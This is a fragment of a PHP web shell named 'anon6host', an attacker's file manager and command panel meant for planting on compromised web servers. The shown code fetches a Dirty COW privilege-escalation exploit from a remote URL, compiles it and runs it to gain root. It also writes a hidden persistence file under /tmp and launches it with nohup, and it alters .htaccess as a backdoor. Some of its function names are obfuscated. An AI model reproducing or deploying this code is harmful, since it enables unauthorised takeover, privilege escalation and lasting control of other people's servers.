...
<head>
    <meta charset="UTF-8">
    <title>anon6host [ <?= $_SERVER['HTTP_HOST']; ?> ]</title>
...
#r00t@<?= $_SERVER['HTTP_HOST']; ?> <br>
https://anon6host.my.id // anon6host bypass
<?php
@set_time_limit(0);
@clearstatcache();
...
<body>
    ...
    <div class="border">
        ...
        <table style="width:100%;">
            <thead>
                <tr><th>Name</th><th>Size</th><th>Permission</th><th>Date</th>
...
<?php
                        ...
                        if ($terminal == "root") {
                            ...
                            if (suggest_exploit() == "5.11") {
                                ...
                                echo _mad_cmd("wget " . $GLOBALS['fungsi'][35] . " -O dirty.c --no-check-certificate");echo _mad_cmd("gcc -pthread dirty.c -o dirty -lcrypt");echo _mad_cmd("chmod +x dirty");echo"Creating Password using 'MrMad'\n";
...
if ($_GET['lock'] == "shell") {
    ...
    if (file_exists('/tmp/Acx0' . awalanFile(namaFile()) . 'wplers0x.do.not.remove.this.Lock')) {
        FiLe_pUt_ConTentS($tmp . "/as" . pwdnostrip() . "pxha" . awalanFile(namaFile()) . "ndler0.Lock", $text);_mad_cmd("nohup php " . $tmp . "/as" . pwdnostrip() . "pxha" . awalanFile(namaFile()) . "ndler0.Lock &");}
}
if ($_GET['backdoor'] == True){// check if htaccess havethis code
    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
    $cari_code =explode('<', $file_htaccess);if (!end($cari_code) == '/FilesMatch>') {
...
function perms($file)
{
    ...
    if (($perms & 0xC000) == 0xC000) {
        ...
        // Regular$info ='-';
    } elseif (($perms &0x6000) == 0x6000) {// Blockspecial$info = 'b';
